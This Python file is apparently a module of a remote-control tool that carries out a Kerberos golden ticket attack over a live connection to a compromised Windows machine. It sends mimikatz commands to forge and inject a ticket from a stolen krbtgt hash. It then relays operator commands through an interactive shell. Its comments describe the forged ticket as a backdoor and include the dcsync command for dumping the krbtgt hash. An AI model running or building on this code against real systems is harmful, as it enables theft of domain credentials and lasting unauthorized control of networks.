import struct

"""
黄金票据攻击，并不是一种普通的攻击方式，该攻击方式其实是一种后门的形式，属于第二次进行攻击的方法，第一次拿到域管权限之后，
需要将krbtgt hash进行保存，当第二次再来进行渗透攻击时，我们就可以使用krbtgt hash制作黄金票据，从而获得管理员权限。
"""
"""
    导出 krbtgt的 NTLM Hash。Krbtgt账户的密码hash存储在域控制器上。
    以下命令在域控执行,目的是获取krbtgt的 NTLM Hash。
    command = "mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:" + domain_name + " /user:krbtgt\""
"""


# 黄金票据传递攻击
# 黄金票据攻击相当于一个后门，制作黄金票据最重要的是获取到Krbtgt用户的hash。
# 以下命令在非域控下执行
def Golden_Ticket(conn, choice):
    print('\033[1;34;34m' + "[*] Viewing and clearing tickets for the current session:" + '\033[0m')
    command = "mimikatz.exe \"privilege::debug\" \"kerberos::list\" \"kerberos::purge\" exit"
    receive(conn, command)
    print('\033[1;34;34m' + "[*] Preparing gold ticket:" + '\033[0m')
    command2 = "mimikatz.exe \"privilege::debug\" \"kerberos::golden /admin:" + choice.split()[4] + " /domain:" + choice.split()[1] + " /sid:" + choice.split()[3] + " /krbtgt:" + choice.split()[2] + " /ticket:ticket.kirbi\" exit"
    receive(conn, command2)
    print('\033[1;34;34m' + "[*] Start importing gold ticket:" + '\033[0m')
    command3 = "mimikatz.exe \"privilege::debug\" \"kerberos::ptt ticket.kirbi\" \"kerberos::list\" exit"
    receive(conn, command3)
    print('\033[1;34;34m' + "[*] Viewing the new tickets:" + '\033[0m')
    command4 = "mimikatz.exe \"privilege::debug\" \"kerberos::tgt\" exit"
    receive(conn, command4)
    print('\033[1;32;32m' + "[+] Now you can try using 'dir' to connect to the target host" + '\033[0m')
    while True:
        command = input('\033[1;33;33m' + "Gold Ticket > " + '\033[0m')
        if command.lower() == 'exit':
            break
        elif command == "":
            continue
        receive(conn, command)


def receive(conn, command):
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
